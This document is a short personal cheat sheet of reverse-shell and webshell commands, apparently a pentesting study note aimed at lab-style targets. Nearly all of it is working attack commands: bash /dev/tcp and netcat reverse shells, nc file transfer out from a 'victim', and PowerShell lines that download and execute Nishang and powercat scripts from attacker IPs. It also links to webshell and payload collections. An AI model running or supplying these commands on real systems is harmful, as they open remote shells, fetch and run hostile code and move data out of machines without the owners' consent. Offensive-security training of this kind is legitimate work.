---
publish: true
created: 2026-02-06T17:47:44.429+05:30
modified: 2026-06-22T09:01:54.540+05:30
---

### webshells

[Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)
[wwwolf-webshell.php](https://github.com/JohnTroony/php-webshells/blob/master/Collection/wwwolf-webshell.php)
[Revshells.com](https://www.revshells.com/)
<https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx>

# Linux

## bash

bash one liners.

```bash
bash -i >& /dev/tcp/your_ip_here/1234 0>&1

bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"
```

## netcat

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.244 22 >/tmp/f

## To listen on port 1234

nc -lnvp 1234

## To connect to remote host on port

nc hostname 1234

## Using nc to get reverse shell on attacker machine

nc -e /bin/sh 10.10.14.17 443
  

## For sending files.

nc -lp 1234 > out.file ## attacker

nc -w 3 [destination] 1234 < out.file ## victim
```

## msfvenom

refer [[000-Concepts/Metasploit framework#^a6da29|Metasploit framework]]

# Windows

## Nishang's Invoke

1. `Invoke-ConPtyShell.ps1`
2. `Invoke-PowerShellTcp.ps1`

Download and execute directly.

```powershell
cmd /c powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.94:8000/Invoke-PowerShellTcp.ps1')
```

You need to edit the files to get execution on download in first way.

```
Invoke-ConPtyShell -RemoteIp 10.10.14.36 -RemotePort 1234 -Rows 80 -Cols 200
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 1234
```

## powercat

```
## powercat oneliner
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193:80/powercat.ps1'); powercat -c 192.168.45.193 -p 21 -e powershell"
```
